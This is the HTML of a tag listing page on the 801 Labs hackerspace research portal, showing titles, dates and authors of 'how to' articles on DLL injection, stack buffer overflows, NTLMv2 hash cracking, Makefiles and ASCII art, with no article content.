<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><title>Research Portal: how to | 801 Labs</title><meta name="description" content="description"/><link rel="canonical" href="https://www.801labs.org/research-portal/tag/how-to/1"/><link rel="icon" href="/favicon.png" sizes="16x16"/><meta property="og:title" content="Research Portal: how to | 801 Labs"/><meta property="og:description" content="Read our research articles, stories, biohacking, reverse engineering, how-to videos, and more!"/><meta property="og:image" content="https://www.801labs.org/images/801labs-cover.jpg"/><meta property="og:url" content="https://www.801labs.org/research-portal/tag/how-to/1"/><meta property="og:site_name" content="801 Labs"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:site" content="@801Labs"/><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="theme-color" content="#6bf0c2"/><link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,400;0,700;0,900;1,400&amp;family=Tomorrow:wght@400;600;700&amp;display=swap" rel="stylesheet"/><meta name="google-site-verification" content="QnlAT_0caLTAeL1e8V-RlHWBX7xauM_CnxY_5-ltIF4"/><link rel="preload" href="/_next/static/css/63a0cb2b4cb051440404.css" as="style"/><link rel="stylesheet" href="/_next/static/css/63a0cb2b4cb051440404.css" data-n-g=""/><noscript data-n-css="true"></noscript><link rel="preload" href="/_next/static/chunks/main-b734f4d0c2c599295fe6.js" as="script"/><link rel="preload" href="/_next/static/chunks/webpack-e067438c4cf4ef2ef178.js" as="script"/><link rel="preload" href="/_next/static/chunks/framework.464b393922c27508c360.js" as="script"/><link rel="preload" href="/_next/static/chunks/commons.baecec2b1f31cc8f0ab6.js" as="script"/><link rel="preload" href="/_next/static/chunks/pages/_app-e662323251d69bbbf5e5.js" as="script"/><link rel="preload" href="/_next/static/chunks/cb1608f2.9b44609261640b8f626b.js" as="script"/><link rel="preload" href="/_next/static/chunks/a9a7754c.53d20200875279da8636.js" as="script"/><link rel="preload" href="/_next/static/chunks/16bc220b6d50f93026463b2cd002c45681ffbe2f.62ec2799f7445d763091.js" as="script"/><link rel="preload" href="/_next/static/chunks/269ea3ef5216fdb5e29fe1b24ee03a8936e3d31a.bf08c7a312d87b9b94e6.js" as="script"/><link rel="preload" href="/_next/static/chunks/pages/research-portal/tag/%5Btag%5D/%5Bpage%5D-d037980a625fd369c695.js" as="script"/></head><body><div id="__next"><div class="bg-white font-sans fluid-text-base"><div class="fixed inset-0 z-40 bg-graphite-800 hidden" style="--bg-opacity:0.4"></div><div class="fixed right-0 top-0 h-screen overflow-y-auto z-50 w-full sm:w-64 font-display bg-graphite-800 text-white hidden"><div class="px-5 pt-5 text-right"><button class="px-4 py-2" title="Close Menu"><span class="sr-only">Close Menu</span><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="times" class="svg-inline--fa fa-times fa-w-11 fa-lg " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 352 512"><path fill="currentColor" d="M242.72 256l100.07-100.07c12.28-12.28 12.28-32.19 0-44.48l-22.24-22.24c-12.28-12.28-32.19-12.28-44.48 0L176 189.28 75.93 89.21c-12.28-12.28-32.19-12.28-44.48 0L9.21 111.45c-12.28 12.28-12.28 32.19 0 44.48L109.28 256 9.21 356.07c-12.28 12.28-12.28 32.19 0 44.48l22.24 22.24c12.28 12.28 32.2 12.28 44.48 0L176 322.72l100.07 100.07c12.28 12.28 32.2 12.28 44.48 0l22.24-22.24c12.28-12.28 12.28-32.19 0-44.48L242.72 256z"></path></svg></button></div><ul class="pt-2 pb-5 fluid-text-lg"><li><a class="py-1 px-5 link--white" href="/about/">About</a><ul class="fluid-text-base"><li><a class="py-1 pl-10 pr-5 link--white" href="/about/financial-information/">Financial Information</a></li><li><a class="py-1 pl-10 pr-5 link--white" href="/about/news/1/">News</a></li></ul></li><li><a class="py-1 px-5 link--white" href="/research-portal/1/">Learn</a></li><li><a class="py-1 px-5 link--white" href="/get-involved/">Get Involved</a><ul class="fluid-text-base"><li><a class="py-1 pl-10 pr-5 link--white" href="/get-involved/events/">Events</a></li><li><a class="py-1 pl-10 pr-5 link--white" href="/get-involved/location-and-hours/">Location and Hours</a></li><li><a class="py-1 pl-10 pr-5 link--white" href="/hackercamp/">Hackercamp</a></li></ul></li><li><a class="py-1 px-5 link--white" href="/nonprofit/">Nonprofit</a></li><li><a class="py-1 px-5 link--white" href="/contact/">Contact Us</a></li><li><a class="py-1 px-5 link--tangerine font-bold" href="/donate/">DonateÂ &gt;</a></li></ul></div><div class="page"><header class="page-header font-display bg-graphite-800 text-white"><div class="container mx-auto px-5 lg:px-10 xl:px-16 py-3 lg:py-5 flex"><div class="flex-initial"><a class="text-white" href="/"><svg xmlns="http://www.w3.org/2000/svg" class="fill-current" viewBox="0 0 1566.7 420.9" width="217"><title>801 Labs - a Community Hackerspace</title><path d="M131.5 261.8h24.1c1.8 0 3.2 1.5 3.2 3.2 0 1.8-1.5 3.2-3.2 3.2h-24.1c-1.8 0-3.2-1.5-3.2-3.2-.1-1.8 1.4-3.2 3.2-3.2z"></path><path d="M194.9 148.8V60.9c13-4.1 21.9-16.1 21.9-29.8 0-17.2-14-31.2-31.2-31.2h-85.3c-13.6.1-25.7 9-29.7 22-5.1 16.4 4.1 33.9 20.5 39v87.8c-7.5 2.9-14.8 6.5-21.7 10.6-67.6 40.6-89.6 128.2-49.1 195.8 12.9 21.3 31 39.1 52.6 51.6 18.4 10.7 29.7 12.9 32.7 13.4 12.1 1.7 22.7-1.3 30.5-8.8 9.3-8.8 14.9-23.7 16.6-44.2.6-8.6.7-17.3.3-25.9 3.6-2.4 6.3-6.1 7.3-10.7l.3-1.2c0-.6.1-1.5.1-2.4h16c6.3 0 11.5-5.1 11.5-11.4v-.9h-.2c.1-.6.2-1.2.2-1.7l.2-34.4c0-1.5-1.2-2.6-2.6-2.6h-1.2c-1.5 0-2.6-1.2-2.6-2.7l.1-39.6c0-1.4-1.2-2.6-2.6-2.6l-71.7-.2c-1.4 0-2.6 1.2-2.6 2.6l-.1 39.6c0 1.4-1.2 2.6-2.6 2.6h-1.2c-1.4 0-2.6 1.2-2.6 2.6l-.1 34.6c0 .6.1 1.3.2 1.9h-.2v.7c0 6.3 5.1 11.5 11.4 11.5h16.3c.1.8.4 1.6.6 2.4 0 0 3.3 8.8 9.1 12.8 1 22.2-.7 46.7-11.5 56.8-4.1 3.9-9.4 5.3-16.5 4.3-.4-.1-9.7-1.5-26.5-11.2-19.1-11-35.1-26.7-46.5-45.6-3.5-5.8-6.5-11.9-9-18.2-25.6-64.5 6-137.5 70.4-163.1 2-.8 11.7-5.7 11.7-11.3V54.2v-.6c0-4.6-3.7-8.2-8.2-8.2-7.8-.1-14-6.6-13.9-14.4.1-7.8 6.6-14 14.4-13.9h85.3c7.8-.1 14.2 6.1 14.4 13.9.1 7.8-6.1 14.2-13.9 14.4h-.6c-4.5.3-7.9 4.3-7.6 8.9v99.5c0 5.9 9.8 10.6 11.7 11.3 47.9 19.1 79.3 65.5 79.3 117 0 57.5-38.5 107.7-93.5 122.1-3.7 1-6.3 4.4-6.3 8.2 0 4.7 3.8 8.5 8.5 8.5.7 0 1.5-.1 2.2-.2 62.5-16.4 106.2-73.4 106.2-138.6-.1-59-36.3-111.9-91.2-133.3zm-62.8 155.4l-1.6 7.7c-.4 1.5-1.7 2.5-3.2 2.5l-13.4-.3c-1.5 0-2.6-1.2-2.6-2.7V291c0-1.4 1.2-2.6 2.6-2.6h1.2c1.4 0 2.6-1.2 2.6-2.6l.1-39.6c0-1.4 1.2-2.6 2.6-2.6h5.4c1.4 0 2.6 1.2 2.6 2.6v7.6c0 1.5 1.2 2.6 2.6 2.6h1.2c1.4 0 2.6-1.2 2.6-2.6v-7.3c0-1.4 1.2-2.6 2.6-2.7l11.9-.1c1.4.1 2.5 1.2 2.5 2.6v7.5c0 1.4 1.2 2.6 2.6 2.6h1.3c1.4 0 2.6-1.2 2.6-2.6v-7.6c0-1.4 1.2-2.6 2.6-2.6h5.3c1.5 0 2.7 1.1 2.7 2.6v.1l-.1 39.6c0 1.5 1.2 2.6 2.6 2.6h1.2c1.5 0 2.6 1.2 2.6 2.6v20.4c0 1.4-1.2 2.6-2.6 2.6h-13.4c-1.5-.1-2.8-1.1-3.1-2.6l-1.6-7.7c-.4-1.5-1.6-2.5-3.1-2.5l-16.4.2c-1.2.2-2.5 1.2-2.9 2.7z"></path><path d="M453.1 366.9c-40 0-64.9-24.1-64.9-59.7v-30c-.9-17 8.3-32.9 23.3-40.8-14.1-6.3-23-21.5-23-40.8v-26.9c0-35.6 24.5-59.7 64.5-59.7s64.9 24.1 64.9 59.7v26.9c0 19.3-8.9 34.5-23 40.8 15.2 7.8 24.4 23.7 23.7 40.8v30c.1 35.7-25.1 59.7-65.5 59.7zm23.7-196.5c-.6-13-11.7-23-24.7-22.4-12.1.6-21.8 10.3-22.4 22.4V203c1.1 13 12.5 22.7 25.5 21.6 11.5-1 20.6-10.1 21.6-21.6v-32.6zm.4 100.4c0-11.5-8.2-21.9-24.1-21.9-11.8-1-22.3 7.8-23.3 19.6-.1.8-.1 1.5-.1 2.3v34.5c-.7 12.2 8.7 22.7 20.9 23.3h2.4c12.4.8 23.2-8.6 24.1-21 .1-.8.1-1.5 0-2.3v-34.5zM630.3 366.9c-40 0-65.6-25.9-65.6-64.1V173.7c0-38.6 25.5-64.1 65.6-64.1 40.1 0 66 25.5 66 64.1v129.1c-.1 38.2-25.6 64.1-66 64.1zM654 170.1c0-11.9-8.9-21.5-23.7-21.5-11.8-1-22.3 7.8-23.3 19.6-.1.6-.1 1.3-.1 1.9v135.7c0 11.9 9.6 21.6 21.4 21.6.6 0 1.3 0 1.9-.1 14.8 0 23.7-9.6 23.7-21.5V170.1zM753.7 361.4V134.2c14.1 0 19.3-9.3 19.3-19.6h23.3v246.8h-42.6zM930.6 361.4V114.5h45.9v206.1h69v40.8H930.6zM1174.8 361.4l-8.2-48.4h-43.7l-8.9 48.4h-43l49.6-246.8h51.5l49.5 246.8h-46.8zm-28.9-180.2l-16.7 95.3h31.5l-14.8-95.3zM1335.3 361.4h-77.8V114.5h77.2c33.7 0 54.5 18.2 54.5 52.3v26.9c0 21.1-8.2 37.1-29.3 41.5 22.2 5.9 30.4 21.1 30.4 41.9v32.3c-.2 34.2-21.3 52-55 52zm9.6-191.3c0-11.1-4.8-17.8-16.1-17.8h-24.9v67.8h23c11.9 0 18.2-6.3 18.2-19.3l-.2-30.7zm.7 103.5c0-13-6.3-19.6-18.2-19.6h-23.7v69.9h25.9c11.5 0 16.1-6.3 16.1-17.8l-.1-32.5zM1498.4 366.9c-42.3 0-68.6-25.2-68.6-63.7v-17.1h42.3v14.5c0 18.2 8.5 28.2 25.2 28.2s24.5-9.6 24.5-24.9c0-19.6-12.6-33-37.1-51.2-24.5-18.2-52.6-42.6-52.6-77.1 0-35.6 23-66.3 67.5-66.3 38.9 0 64.9 26.9 64.9 63.4v16.1h-41.9V174c0-15.2-7.8-26.3-23.3-26.3-11.5-.8-21.4 7.8-22.2 19.3-.1 1-.1 1.9 0 2.9 0 20.8 12.2 31.5 39.6 51.5 29.3 21.9 50 44.1 50 77.5-.2 39.5-27.7 68-68.3 68z"></path></svg></a></div><div class="lg:hidden flex-1 text-right"><button class="px-4 py-2" title="Toggle Menu"><span class="sr-only">Toggle Menu</span><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="bars" class="svg-inline--fa fa-bars fa-w-14 fa-lg " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"></path></svg></button></div><ul class="flex-1 hidden lg:flex justify-end fluid-text-lg"><li class="group relative"><a class="p-3 link--white" href="/about/">About</a><ul class="hidden group-focus-within:block group-hover:block py-2 absolute left-0 w-64 bg-graphite-800 fluid-text-base"><li><a class="block py-1 px-5 link--white" href="/about/financial-information/">Financial Information</a></li><li><a class="block py-1 px-5 link--white" href="/about/news/1/">News</a></li></ul></li><li class="group relative"><a class="p-3 link--white" href="/research-portal/1/">Learn</a></li><li class="group relative"><a class="p-3 link--white" href="/get-involved/">Get Involved</a><ul class="hidden group-focus-within:block group-hover:block py-2 absolute left-0 w-64 bg-graphite-800 fluid-text-base"><li><a class="block py-1 px-5 link--white" href="/get-involved/events/">Events</a></li><li><a class="block py-1 px-5 link--white" href="/get-involved/location-and-hours/">Location and Hours</a></li><li><a class="block py-1 px-5 link--white" href="/hackercamp/">Hackercamp</a></li></ul></li><li class="group relative"><a class="p-3 link--white" href="/nonprofit/">Nonprofit</a></li><li class="group relative"><a class="p-3 link--white" href="/contact/">Contact Us</a></li><li class="group relative"><a class="p-3 link--tangerine font-bold" href="/donate/">DonateÂ &gt;</a></li></ul></div></header><main class="page-content"><div class="bg-graphite-900 bg-image-grid bg-top text-white"><div class="container-1400 mx-auto px-5 py-20 text-center"><h1 class="h1 text-shadow-glow">801 Labs Research Portal</h1></div></div><div class="bg-gray-200"><div class="container-1400 mx-auto px-5 py-20 lg:flex"><div class="lg:w-3/4"><h2 class="h4 mb-10">how to</h2><div class="grid md:grid-cols-2 xl:grid-cols-6 gap-6"><a class="flex flex-col bg-white text-black shadow xl:col-span-3" href="/research-portal/post/developing-a-dll-injector/"><div class="relative aspect-ratio-16:9"><img loading="lazy" src="/_next/static/images/process-explorer-test-dll-injection-success-320-4c3ea14f721f498145f270602b4fb293.png" sizes="(min-width: 1920px) 460px, (min-width: 1280px) 25vw, (min-width: 768px) 50vw, 100vw" alt="DLL injection - Developing a simple injector." class="absolute inset-0 w-full h-full object-cover" srcSet="/_next/static/images/process-explorer-test-dll-injection-success-320-4c3ea14f721f498145f270602b4fb293.png 320w,/_next/static/images/process-explorer-test-dll-injection-success-640-ccf24fee1f07f598aa51e21babc83f48.png 640w,/_next/static/images/process-explorer-test-dll-injection-success-787-24f050b26483fbdde8070ee31259b7d5.png 787w" width="787" height="586" style="max-width:min(100%, 787px)"/></div><div class="p-6 flex-1 flex flex-col"><p class="text-teal-700 font-bold fluid-text-xs uppercase">how to</p><h2 class="fluid-text-lg mb-1 font-bold">DLL injection - Developing a simple injector.</h2><p class="text-gray-700 fluid-text-xs mb-5"><time dateTime="2019-02-07T04:32:00.000Z">February 7, 2019</time></p><div class="mt-auto flex items-center fluid-text-xs text-gray-700"><img loading="lazy" src="/_next/static/images/th3v0id-100-7e0a4d7158243ebe6a422f42fe9c47b3.jpg" sizes="32px" alt="th3v0id" class="h-8 w-8 object-cover rounded-full mr-3" srcSet="/_next/static/images/th3v0id-100-7e0a4d7158243ebe6a422f42fe9c47b3.jpg 100w" width="100" height="100" style="max-width:min(100%, 100px)"/>th3v0id</div></div></a><a class="flex flex-col bg-white text-black shadow xl:col-span-3" href="/research-portal/post/stack-exploitation/"><div class="relative aspect-ratio-16:9"><img loading="lazy" src="/_next/static/images/gef-320-d2277d9e109013776845c770bb1abfd6.jpg" sizes="(min-width: 1920px) 460px, (min-width: 1280px) 25vw, (min-width: 768px) 50vw, 100vw" alt="Exploiting a Stack Buffer Overflow (ret2libc method)" class="absolute inset-0 w-full h-full object-cover" srcSet="/_next/static/images/gef-320-d2277d9e109013776845c770bb1abfd6.jpg 320w,/_next/static/images/gef-640-d31b3392c6f005d222b20944be5ffe6e.jpg 640w,/_next/static/images/gef-960-f7ace55ae4b30dd131e9d735af78c980.jpg 960w,/_next/static/images/gef-1280-c132bcd7fe22557b565bdfd266b67bee.jpg 1280w,/_next/static/images/gef-1373-6a5b40dcbe8457a228afc90e9f097c84.jpg 1373w" width="1373" height="1127" style="max-width:min(100%, 1373px)"/></div><div class="p-6 flex-1 flex flex-col"><p class="text-teal-700 font-bold fluid-text-xs uppercase">research</p><h2 class="fluid-text-lg mb-1 font-bold">Exploiting a Stack Buffer Overflow (ret2libc method)</h2><p class="text-gray-700 fluid-text-xs mb-5"><time dateTime="2019-01-18T12:05:00.000Z">January 18, 2019</time></p><div class="mt-auto flex items-center fluid-text-xs text-gray-700"><img loading="lazy" src="/_next/static/images/th3v0id-100-7e0a4d7158243ebe6a422f42fe9c47b3.jpg" sizes="32px" alt="th3v0id" class="h-8 w-8 object-cover rounded-full mr-3" srcSet="/_next/static/images/th3v0id-100-7e0a4d7158243ebe6a422f42fe9c47b3.jpg 100w" width="100" height="100" style="max-width:min(100%, 100px)"/>th3v0id</div></div></a><a class="flex flex-col bg-white text-black shadow xl:col-span-2" href="/research-portal/post/cracking-an-ntlmv2-hash/"><div class="relative aspect-ratio-16:9"><img loading="lazy" src="/_next/static/images/CredUIHTTPAuth-320-2296bf7d1cc87eefa2c464fecf3a75b5.jpg" sizes="(min-width: 1920px) 460px, (min-width: 1280px) 25vw, (min-width: 768px) 50vw, 100vw" alt="A 9-step recipe to crack a NTLMv2 Hash from a freshly acquired .pcap" class="absolute inset-0 w-full h-full object-cover" srcSet="/_next/static/images/CredUIHTTPAuth-320-2296bf7d1cc87eefa2c464fecf3a75b5.jpg 320w,/_next/static/images/CredUIHTTPAuth-459-cb9d9227acd3acafa2595f0f85aa2d3b.jpg 459w" width="459" height="330" style="max-width:min(100%, 459px)"/></div><div class="p-6 flex-1 flex flex-col"><p class="text-teal-700 font-bold fluid-text-xs uppercase">how to</p><h2 class="fluid-text-lg mb-1 font-bold">A 9-step recipe to crack a NTLMv2 Hash from a freshly acquired .pcap</h2><p class="text-gray-700 fluid-text-xs mb-5"><time dateTime="2018-12-18T22:00:00.000Z">December 18, 2018</time></p><div class="mt-auto flex items-center fluid-text-xs text-gray-700"><img loading="lazy" src="/_next/static/images/kimb3r-100-d5c9e68b10f75f874793297f6eb36262.jpg" sizes="32px" alt="kimb3r" class="h-8 w-8 object-cover rounded-full mr-3" srcSet="/_next/static/images/kimb3r-100-d5c9e68b10f75f874793297f6eb36262.jpg 100w" width="100" height="100" style="max-width:min(100%, 100px)"/>kimb3r</div></div></a><a class="flex flex-col bg-white text-black shadow xl:col-span-2" href="/research-portal/post/makefiles-but-in-english-part-1/"><div class="relative aspect-ratio-16:9"><img loading="lazy" src="/_next/static/images/makefile-1-320-6ddfe3638763e3aa7204e27b0ac0e2bc.jpg" sizes="(min-width: 1920px) 460px, (min-width: 1280px) 25vw, (min-width: 768px) 50vw, 100vw" alt="Makefiles, but in English: Part 1" class="absolute inset-0 w-full h-full object-cover" srcSet="/_next/static/images/makefile-1-320-6ddfe3638763e3aa7204e27b0ac0e2bc.jpg 320w,/_next/static/images/makefile-1-640-06d546d401c0c29d9b2b1d5488ca6ef8.jpg 640w,/_next/static/images/makefile-1-817-833c69f280992f33589744e322ca8323.jpg 817w" width="817" height="476" style="max-width:min(100%, 817px)"/></div><div class="p-6 flex-1 flex flex-col"><p class="text-teal-700 font-bold fluid-text-xs uppercase">how to</p><h2 class="fluid-text-lg mb-1 font-bold">Makefiles, but in English: Part 1</h2><p class="text-gray-700 fluid-text-xs mb-5"><time dateTime="2018-12-13T00:00:00.000Z">December 13, 2018</time></p><div class="mt-auto flex items-center fluid-text-xs text-gray-700"><img loading="lazy" src="/_next/static/images/david-freitag-100-34936e05076611e5c0352049d2085e40.jpg" sizes="32px" alt="David Freitag" class="h-8 w-8 object-cover rounded-full mr-3" srcSet="/_next/static/images/david-freitag-100-34936e05076611e5c0352049d2085e40.jpg 100w" width="100" height="100" style="max-width:min(100%, 100px)"/>David Freitag</div></div></a><a class="flex flex-col bg-white text-black shadow xl:col-span-2" href="/research-portal/post/ascii-art-in-hidden-places/"><div class="relative aspect-ratio-16:9"><img loading="lazy" src="/_next/static/images/4TJDOj5-320-9c5528a142bb3187c2f68f6774d75456.jpg" sizes="(min-width: 1920px) 460px, (min-width: 1280px) 25vw, (min-width: 768px) 50vw, 100vw" alt="ASCII art in hidden places" class="absolute inset-0 w-full h-full object-cover" srcSet="/_next/static/images/4TJDOj5-320-9c5528a142bb3187c2f68f6774d75456.jpg 320w,/_next/static/images/4TJDOj5-640-dbec3c0b4a32f7f7b6058a999dc8ddf3.jpg 640w,/_next/static/images/4TJDOj5-960-1d3ece90dd0c24ce89b613a24b5ea172.jpg 960w,/_next/static/images/4TJDOj5-995-d4c21a5f5c222e23fe59864e2386866d.jpg 995w" width="995" height="660" style="max-width:min(100%, 995px)"/></div><div class="p-6 flex-1 flex flex-col"><p class="text-teal-700 font-bold fluid-text-xs uppercase">research</p><h2 class="fluid-text-lg mb-1 font-bold">ASCII art in hidden places</h2><p class="text-gray-700 fluid-text-xs mb-5"><time dateTime="2018-10-31T01:25:25.000Z">October 31, 2018</time></p><div class="mt-auto flex items-center fluid-text-xs text-gray-700"><img loading="lazy" src="/_next/static/images/pips-100-116f8f744b447e9b8511b603e12440ee.jpg" sizes="32px" alt="Pips" class="h-8 w-8 object-cover rounded-full mr-3" srcSet="/_next/static/images/pips-100-116f8f744b447e9b8511b603e12440ee.jpg 100w" width="100" height="100" style="max-width:min(100%, 100px)"/>Pips</div></div></a></div></div><aside class="lg:order-first lg:w-1/4 mt-20 lg:mt-0 lg:mr-10 xl:mr-20"><div><h3 class="fluid-text-lg font-bold bg-black text-white px-5 py-1 mb-3">Tags</h3><ul class="px-5 py-1 space-y-2"><li><a href="/research-portal/tag/biohacking/1/">biohacking</a></li><li><a href="/research-portal/tag/buffer-overflow/1/">buffer overflow</a></li><li><a href="/research-portal/tag/development/1/">Development</a></li><li><a href="/research-portal/tag/dll-injection/1/">DLL Injection</a></li><li><a href="/research-portal/tag/domains/1/">domains</a></li><li><a href="/research-portal/tag/ee/1/">EE</a></li><li><a href="/research-portal/tag/how-to/1/">how to</a></li><li><a href="/research-portal/tag/ipv6/1/">IPv6</a></li><li><a href="/research-portal/tag/makefile/1/">Makefile</a></li><li><a href="/research-portal/tag/memory/1/">memory</a></li><li><a href="/research-portal/tag/pcap/1/">pcap</a></li><li><a href="/research-portal/tag/phishing/1/">phishing</a></li><li><a href="/research-portal/tag/re/1/">RE</a></li><li><a href="/research-portal/tag/research/1/">research</a></li><li><a href="/research-portal/tag/rfid/1/">RFID</a></li><li><a href="/research-portal/tag/story/1/">Story</a></li><li><a href="/research-portal/tag/tutorial/1/">Tutorial</a></li><li><a href="/research-portal/tag/windows-api/1/">Windows API</a></li><li><a href="/research-portal/tag/windows-hacking/1/">Windows Hacking</a></li></ul></div></aside></div></div></main><footer class="page-footer bg-lime-900 text-white pt-10 pb-16"><div class="container-1200 mx-auto px-5"><ul class="flex flex-wrap justify-center mb-10"><li class="m-3"><a class="link--white" href="https://discord.gg/uRSthurdPY" rel="noopener" target="_blank" title="Discord"><span class="sr-only">Discord</span><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="discord" class="svg-inline--fa fa-discord fa-w-20 fa-3x " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M524.531,69.836a1.5,1.5,0,0,0-.764-.7A485.065,485.065,0,0,0,404.081,32.03a1.816,1.816,0,0,0-1.923.91,337.461,337.461,0,0,0-14.9,30.6,447.848,447.848,0,0,0-134.426,0,309.541,309.541,0,0,0-15.135-30.6,1.89,1.89,0,0,0-1.924-.91A483.689,483.689,0,0,0,116.085,69.137a1.712,1.712,0,0,0-.788.676C39.068,183.651,18.186,294.69,28.43,404.354a2.016,2.016,0,0,0,.765,1.375A487.666,487.666,0,0,0,176.02,479.918a1.9,1.9,0,0,0,2.063-.676A348.2,348.2,0,0,0,208.12,430.4a1.86,1.86,0,0,0-1.019-2.588,321.173,321.173,0,0,1-45.868-21.853,1.885,1.885,0,0,1-.185-3.126c3.082-2.309,6.166-4.711,9.109-7.137a1.819,1.819,0,0,1,1.9-.256c96.229,43.917,200.41,43.917,295.5,0a1.812,1.812,0,0,1,1.924.233c2.944,2.426,6.027,4.851,9.132,7.16a1.884,1.884,0,0,1-.162,3.126,301.407,301.407,0,0,1-45.89,21.83,1.875,1.875,0,0,0-1,2.611,391.055,391.055,0,0,0,30.014,48.815,1.864,1.864,0,0,0,2.063.7A486.048,486.048,0,0,0,610.7,405.729a1.882,1.882,0,0,0,.765-1.352C623.729,277.594,590.933,167.465,524.531,69.836ZM222.491,337.58c-28.972,0-52.844-26.587-52.844-59.239S193.056,219.1,222.491,219.1c29.665,0,53.306,26.82,52.843,59.239C275.334,310.993,251.924,337.58,222.491,337.58Zm195.38,0c-28.971,0-52.843-26.587-52.843-59.239S388.437,219.1,417.871,219.1c29.667,0,53.307,26.82,52.844,59.239C470.715,310.993,447.538,337.58,417.871,337.58Z"></path></svg></a></li><li class="m-3"><a class="link--white" href="https://twitter.com/801labs" rel="noopener" target="_blank" title="Twitter"><span class="sr-only">Twitter</span><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="twitter-square" class="svg-inline--fa fa-twitter-square fa-w-14 fa-3x " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M400 32H48C21.5 32 0 53.5 0 80v352c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zm-48.9 158.8c.2 2.8.2 5.7.2 8.5 0 86.7-66 186.6-186.6 186.6-37.2 0-71.7-10.8-100.7-29.4 5.3.6 10.4.8 15.8.8 30.7 0 58.9-10.4 81.4-28-28.8-.6-53-19.5-61.3-45.5 10.1 1.5 19.2 1.5 29.6-1.2-30-6.1-52.5-32.5-52.5-64.4v-.8c8.7 4.9 18.9 7.9 29.6 8.3a65.447 65.447 0 0 1-29.2-54.6c0-12.2 3.2-23.4 8.9-33.1 32.3 39.8 80.8 65.8 135.2 68.6-9.3-44.5 24-80.6 64-80.6 18.9 0 35.9 7.9 47.9 20.7 14.8-2.8 29-8.3 41.6-15.8-4.9 15.2-15.2 28-28.8 36.1 13.2-1.4 26-5.1 37.8-10.2-8.9 13.1-20.1 24.7-32.9 34z"></path></svg></a></li><li class="m-3"><a class="link--white" href="https://www.meetup.com/801labs/" rel="noopener" target="_blank" title="Meetup"><span class="sr-only">Meetup</span><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="meetup" class="svg-inline--fa fa-meetup fa-w-16 fa-3x " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M99 414.3c1.1 5.7-2.3 11.1-8 12.3-5.4 1.1-10.9-2.3-12-8-1.1-5.4 2.3-11.1 7.7-12.3 5.4-1.2 11.1 2.3 12.3 8zm143.1 71.4c-6.3 4.6-8 13.4-3.7 20 4.6 6.6 13.4 8.3 20 3.7 6.3-4.6 8-13.4 3.4-20-4.2-6.5-13.1-8.3-19.7-3.7zm-86-462.3c6.3-1.4 10.3-7.7 8.9-14-1.1-6.6-7.4-10.6-13.7-9.1-6.3 1.4-10.3 7.7-9.1 14 1.4 6.6 7.6 10.6 13.9 9.1zM34.4 226.3c-10-6.9-23.7-4.3-30.6 6-6.9 10-4.3 24 5.7 30.9 10 7.1 23.7 4.6 30.6-5.7 6.9-10.4 4.3-24.1-5.7-31.2zm272-170.9c10.6-6.3 13.7-20 7.7-30.3-6.3-10.6-19.7-14-30-7.7s-13.7 20-7.4 30.6c6 10.3 19.4 13.7 29.7 7.4zm-191.1 58c7.7-5.4 9.4-16 4.3-23.7s-15.7-9.4-23.1-4.3c-7.7 5.4-9.4 16-4.3 23.7 5.1 7.8 15.6 9.5 23.1 4.3zm372.3 156c-7.4 1.7-12.3 9.1-10.6 16.9 1.4 7.4 8.9 12.3 16.3 10.6 7.4-1.4 12.3-8.9 10.6-16.6-1.5-7.4-8.9-12.3-16.3-10.9zm39.7-56.8c-1.1-5.7-6.6-9.1-12-8-5.7 1.1-9.1 6.9-8 12.6 1.1 5.4 6.6 9.1 12.3 8 5.4-1.5 9.1-6.9 7.7-12.6zM447 138.9c-8.6 6-10.6 17.7-4.9 26.3 5.7 8.6 17.4 10.6 26 4.9 8.3-6 10.3-17.7 4.6-26.3-5.7-8.7-17.4-10.9-25.7-4.9zm-6.3 139.4c26.3 43.1 15.1 100-26.3 129.1-17.4 12.3-37.1 17.7-56.9 17.1-12 47.1-69.4 64.6-105.1 32.6-1.1.9-2.6 1.7-3.7 2.9-39.1 27.1-92.3 17.4-119.4-22.3-9.7-14.3-14.6-30.6-15.1-46.9-65.4-10.9-90-94-41.1-139.7-28.3-46.9.6-107.4 53.4-114.9C151.6 70 234.1 38.6 290.1 82c67.4-22.3 136.3 29.4 130.9 101.1 41.1 12.6 52.8 66.9 19.7 95.2zm-70 74.3c-3.1-20.6-40.9-4.6-43.1-27.1-3.1-32 43.7-101.1 40-128-3.4-24-19.4-29.1-33.4-29.4-13.4-.3-16.9 2-21.4 4.6-2.9 1.7-6.6 4.9-11.7-.3-6.3-6-11.1-11.7-19.4-12.9-12.3-2-17.7 2-26.6 9.7-3.4 2.9-12 12.9-20 9.1-3.4-1.7-15.4-7.7-24-11.4-16.3-7.1-40 4.6-48.6 20-12.9 22.9-38 113.1-41.7 125.1-8.6 26.6 10.9 48.6 36.9 47.1 11.1-.6 18.3-4.6 25.4-17.4 4-7.4 41.7-107.7 44.6-112.6 2-3.4 8.9-8 14.6-5.1 5.7 3.1 6.9 9.4 6 15.1-1.1 9.7-28 70.9-28.9 77.7-3.4 22.9 26.9 26.6 38.6 4 3.7-7.1 45.7-92.6 49.4-98.3 4.3-6.3 7.4-8.3 11.7-8 3.1 0 8.3.9 7.1 10.9-1.4 9.4-35.1 72.3-38.9 87.7-4.6 20.6 6.6 